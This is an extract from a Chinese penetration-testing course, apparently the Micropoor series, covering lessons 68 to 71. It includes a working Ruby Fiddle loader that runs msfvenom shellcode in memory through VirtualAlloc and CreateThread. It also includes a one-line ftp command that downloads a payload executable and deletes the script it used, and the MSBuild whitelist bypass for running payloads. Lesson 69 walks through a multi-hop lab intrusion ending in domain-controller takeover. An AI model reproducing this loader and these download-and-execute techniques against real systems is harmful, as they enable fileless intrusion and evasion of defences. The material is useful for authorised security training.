-441-
本文档使用书栈(BookStack.CN)构建
本季是为配合msf在渗透过程中无文件渗透，提前做基础过度。也为msf插件编写做基础过度。
1. msfvenom‐pwindows/messageboxTEXT=MicropoorTITLE=Micropoor‐fruby
‐‐smallest
1. require'fiddle'
2. require'fiddle/import'
rubyshellcode生成如下：
附源码：
第六十八课：基于Ruby内存加载shellcode第一季
-442-
本文档使用书栈(BookStack.CN)构建
3. require'fiddle/types'
4.
5. #msfvenom‐pwindows/messageboxTEXT=MicropoorTITLE=Micropoor‐fruby‐‐
smallest
6. shellcode=
7. "\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\\xd2\\xb2\\x77\\x31\\xc9\\x64"+
8. "\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x46\\x08\\x8b\\x7e"+
9. "\\x20\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1\\xff\\xe1\\x60"+
10. "\\x8b\\x6c\\x24\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x28\\x78\\x01\\xea\\x8b"
11. "\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x34\\x49\\x8b\\x34\\x8b\\x01"
12. "\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xcf\\x0d"
13. "\\x01\\xc7\\xeb\\xf4\\x3b\\x7c\\x24\\x28\\x75\\xe1\\x8b\\x5a\\x24\\x01"
14. "\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01"
15. "\\xe8\\x89\\x44\\x24\\x1c\\x61\\xc3\\xb2\\x08\\x29\\xd4\\x89\\xe5\\x89"
16. "\\xc2\\x68\\x8e\\x4e\\x0e\\xec\\x52\\xe8\\x9f\\xff\\xff\\xff\\x89\\x45"
17. "\\x04\\xbb\\x7e\\xd8\\xe2\\x73\\x87\\x1c\\x24\\x52\\xe8\\x8e\\xff\\xff"
18. "\\xff\\x89\\x45\\x08\\x68\\x6c\\x6c\\x20\\x41\\x68\\x33\\x32\\x2e\\x64"
19. "\\x68\\x75\\x73\\x65\\x72\\x30\\xdb\\x88\\x5c\\x24\\x0a\\x89\\xe6\\x56"
20. "\\xff\\x55\\x04\\x89\\xc2\\x50\\xbb\\xa8\\xa2\\x4d\\xbc\\x87\\x1c\\x24"
21. "\\x52\\xe8\\x5f\\xff\\xff\\xff\\x68\\x72\\x58\\x20\\x20\\x68\\x6f\\x70"
22. "\\x6f\\x6f\\x68\\x4d\\x69\\x63\\x72\\x31\\xdb\\x88\\x5c\\x24\\x09\\x89"
23. "\\xe3\\x68\\x72\\x58\\x20\\x20\\x68\\x6f\\x70\\x6f\\x6f\\x68\\x4d\\x69"
24. "\\x63\\x72\\x31\\xc9\\x88\\x4c\\x24\\x09\\x89\\xe1\\x31\\xd2\\x52\\x53"
25. "\\x51\\x52\\xff\\xd0\\x31\\xc0\\x50\\xff\\x55\\x08"
26.
27.
28. includeFiddle
29.
30. kernel32=Fiddle.dlopen('kernel32')
31.
32. ptr=Function.new(kernel32['VirtualAlloc'],[4,4,4,4],4).call(0,
shellcode.size,0x3000,0x40)
33.
34. Function.new(kernel32['VirtualProtect'],[4,4,4,4],4).call(ptr,
shellcode.size,0,0)
35.
36. buf=Fiddle::Pointer[shellcode]
37.
38. Function.new(kernel32['RtlMoveMemory'],[4,4,4],4).call(ptr,buf,
shellcode.size)
39.
40. thread=Function.new(kernel32['CreateThread'],[4,4,4,4,4,4],4).call(0,0,
第六十八课：基于Ruby内存加载shellcode第一季
-443-
本文档使用书栈(BookStack.CN)构建
ptr,0,0,0)
41.
42. Function.new(kernel32['WaitForSingleObject'],[4,4],4).call(thread,‐1)
Micropoor
第六十八课：基于Ruby内存加载shellcode第一季
-444-
本文档使用书栈(BookStack.CN)构建
目标资产信息搜集的广度，决定渗透过程的复杂程度。
目标主机信息搜集的深度，决定后渗透权限持续把控。
渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。
持续渗透的本质是线索关联，而线索关联为后续的攻击链方提供了强大的方向。
后渗透的本质是权限把控，而权限把控为后渗透提供了以牺牲时间换取空间强大基础。
靶机背景介绍：
主机A1：CentOsx64全补丁，无提权漏洞，可互联网
主机A2：Windows2008x64全补丁无提权漏洞，脱网机
主机B：Windows2008x64全补丁无提权漏洞，域内主机，脱网机
主机C：Windows2008x64域控，存在ms14-068漏洞，脱网机
且A1，A2，B,C系统主机密码均为强口令
A1，A2，B,C为标准ABC类网，允许访问流程，A1——>A2——>B——>C，不允许跨主机访问。
（请注意每个主机的对应IP段）
整体攻击流程图：
引言（1）：
第六十九课：渗透，持续渗透，后渗透的本质
-445-
本文档使用书栈(BookStack.CN)构建
模拟开始攻击：
扫描主机A1对攻击机开放端口：80,22
扫描主机A1-Web目录结构：
第六十九课：渗透，持续渗透，后渗透的本质
-446-
本文档使用书栈(BookStack.CN)构建
主机A1-Web搜索处存在sql注入：
登录后台得到shell：
第六十九课：渗透，持续渗透，后渗透的本质
-447-
本文档使用书栈(BookStack.CN)构建
生成tcppayload以php一句话执行：
第六十九课：渗透，持续渗透，后渗透的本质
-448-
本文档使用书栈(BookStack.CN)构建
A1对内信息搜集发现A2，并且针对A1，没有可用提权漏洞（Web非root权限），放弃提权：
以A1作为跳板添加虚拟路由，并且开始做针对A2的对内信息搜集：
第六十九课：渗透，持续渗透，后渗透的本质
-449-
本文档使用书栈(BookStack.CN)构建
以A1跳板发现A2部署weblogic，并且存在漏洞。转发目标机7001至本地，利用漏洞。
第六十九课：渗透，持续渗透，后渗透的本质
-450-
本文档使用书栈(BookStack.CN)构建
第六十九课：渗透，持续渗透，后渗透的本质
-451-
本文档使用书栈(BookStack.CN)构建
发现A2全补丁，放弃提权，（weblogic为user权限）对内信息刺探A2，得到weblogic相关
配置文件，解密后，得到密码。
尝试做二级跳板，以weblogic相关配置，尝试对B（域内成员）的渗透（SMB）
第六十九课：渗透，持续渗透，后渗透的本质
-452-
本文档使用书栈(BookStack.CN)构建
获取B权限（system），尝试对内B的本身信息搜集，发现域账号（普通成员）user1.
第六十九课：渗透，持续渗透，后渗透的本质
-453-
本文档使用书栈(BookStack.CN)构建
渗透测试过程，提权是非核心任务，这里也不建议尝试提权，因为在实战过程中获取某个“点”的权限，
过程是及其漫长以及困难的，不要因为某个大胆的尝试，而影响了整个渗透测试流程。
尝试三级跳板，尝试获取sid，以及域控对内相关IP，尝试越权，获取域控权限。
引言（2）：
第六十九课：渗透，持续渗透，后渗透的本质
-454-
本文档使用书栈(BookStack.CN)构建
第六十九课：渗透，持续渗透，后渗透的本质
-455-
本文档使用书栈(BookStack.CN)构建
并没有结束：
在得到域控后，对主机C对内信息搜集，得到域控administrator密码，尝试用该密码ssh—->A1，成功，
root权限。
广告（你需要背下来的广告词）：只要是“一个人”设置的密码“群”，一定有大的规律，只要是“一个行
业”设置的密码“群”一定有规律可寻。
渗透的本质是信息搜集，而要把信息搜集发挥最大效果，一定是离不开“线索关联”，而信息搜集，无论
是对内，对外，更或者是主动信息搜集，被动信息搜集。如何把目标A与B的信息搜集，整理后做“线索
关联”是一个非常有趣的工作。
APT攻击三大要素，既：
攻击手段复杂，持续时间长，高危害性
APT攻击主要分类为两大类，既：
高级持续渗透，即时渗透
引言（4）：
后者的话：
第六十九课：渗透，持续渗透，后渗透的本质
-456-
本文档使用书栈(BookStack.CN)构建
第六十九课：渗透，持续渗透，后渗透的本质
-457-
本文档使用书栈(BookStack.CN)构建
APT两大类攻击核心诉求区别：
第六十九课：渗透，持续渗透，后渗透的本质
-458-
本文档使用书栈(BookStack.CN)构建
在做调研之前，作者一直以为越发达的城市，或者越政治中心的城市是发生攻击的高发地，但是在调研
后，打破了我之前的想法，于是作者深入调研原因究竟，以便更好的了解企业安全建设的规划。
第六十九课：渗透，持续渗透，后渗透的本质
-459-
本文档使用书栈(BookStack.CN)构建
在针对政府机构的攻击中，APT组织除了会攻击一般的政府机构外，还有专门针对公检法的攻击。
第六十九课：渗透，持续渗透，后渗透的本质
-460-
本文档使用书栈(BookStack.CN)构建
在针对能源行业的攻击中，APT组织重点关注的领域依次是：石油、天然气和核能。针对能源行业的攻
击，对国家安全具有很大的影响。
在针对金融行业的攻击中，APT组织最为关注的是银行，其次是证券、互联网金融等。还有部分APT组
织会关注到与虚拟数字货币（如比特币、门罗币等）相关的机构或公司。针对金融机构的攻击大多会利
用安全漏洞。针对ATM自动取款机的攻击也一直延续了2016年的活跃状态。
还有一点值得注意：APT组织的攻击虽然具有很强的针对性，但其攻击目标也并不一定是单一的。有的
APT组织只攻击特定国家特定领域的目标（仅从目前已经披露的情况看），但也有很多APT组织会对多
个国家的不同领域目标展开攻击。上图给出了2017年全球各国研究机构发布的APT研究报告中，披露
APT组织攻击目标的所属国家、领域数量分析。
目前市场上的企业网络安全规划与建设大部分存在统一实施方案，或者是模板方案。而非针对特定行
业，特定客户群体来制定针对方案。而不同行业，不同背景的企业安全规划方案也一定是不相同的。如
传统行业（医药，食品，汽车）对待企业安全的建设是起跑阶段。如金融行业（证券，银行，保险）对
待企业安全的建设是规划与实施阶段。如互联网行业（某度，某巴，某鹅）对待企业安全建设是自研或
商业化阶段。为了更好的了解，所以如上制图，更能清楚的看到，未来企业网络安全对待企业发展的重
要性，以及特定行业特定规划方案，特定行业特定防御对象。如某X企业安全预算为100万，是否应该针
对该企业，行业，地理位置，做防御预算倾斜，并且留有10%-15%的资金量做2月，3月，11月攻击高
发期的预案资金等。
由于信息化，自动化的办公，企业成本的考虑，传统的“以点打面”的点会越来越分散与难以集中管理，
如跨国办公，移动办公等。那么可预知的攻击方式将会以人为突破口的事越来越多。安全的本质又不能
仅仅靠预算与设备的投入而杜绝，尤其是在未来的大型甲方公司，都会有着自己的安全团队，那么如何
把网络安全发展成未来甲方公司的企业文化，将会是一个漫长的过程。而近些年无论是国内还是国外的
官方部门开始重视网络安全，但是效果不明显，这里做一个总结，同样部分也适用于企业：
引言（5）：
总结：
第六十九课：渗透，持续渗透，后渗透的本质
-461-
本文档使用书栈(BookStack.CN)构建
Micropoor
第六十九课：渗透，持续渗透，后渗透的本质
-462-
本文档使用书栈(BookStack.CN)构建
windows全平台自带ftp，在实战中需要考虑两点。
数据传输的完整性。
代码得精简
本季作为第四十课的补充，一句话下载更为精简。更符合于实战。
靶机：
192.168.1.119
demo下载文件为：
bin_tcp_x86_53.exe
1. echoopen127.0.0.1>o&echouser123123>>o&echogetbin_tcp_x86_53.exe>>
o&echoquit>>o&ftp‐n‐s:o&del/F/Qo
第七十课：ftp一句话下载payload补充
-463-
本文档使用书栈(BookStack.CN)构建
缩短一句话下载：
1. echoopen127.0.0.1>o&echogetbin_tcp_x86_53.exe>>o&echoquit>>o&ftp
‐A‐n‐s:o&del/F/Qo
第七十课：ftp一句话下载payload补充
-464-
本文档使用书栈(BookStack.CN)构建
Micropoor
第七十课：ftp一句话下载payload补充
-465-
本文档使用书栈(BookStack.CN)构建
MSBuild是MicrosoftBuildEngine的缩写，代表Microsoft和VisualStudio的新的
生成平台。MSBuild在如何处理和生成软件方面是完全透明的，使开发人员能够在未安装Visual
Studio的生成实验室环境中组织和生成产品。
MSBuild引入了一种新的基于XML的项目文件格式，这种格式容易理解、易于扩展并且完全受
Microsoft支持。MSBuild项目文件的格式使开发人员能够充分描述哪些项需要生成，以及如何利用
不同的平台和配置生成这些项。
说明：Msbuild.exe所在路径没有被系统添加PATH环境变量中，因此，Msbuild命令无法识别。
基于白名单MSBuild.exe配置payload：
Windows7默认位置为：
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
攻击机：192.168.1.4Debian
靶机：192.168.1.3Windows7
1. C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exeMicropoor.xml
MSBuild简介：
靶机执行：
配置攻击机msf：
第七十一课：基于白名单Msbuild.exe执行payload第一季
-466-
本文档使用书栈(BookStack.CN)构建
注：x86payload
1. 
2.
3. 
4.
5. 
6.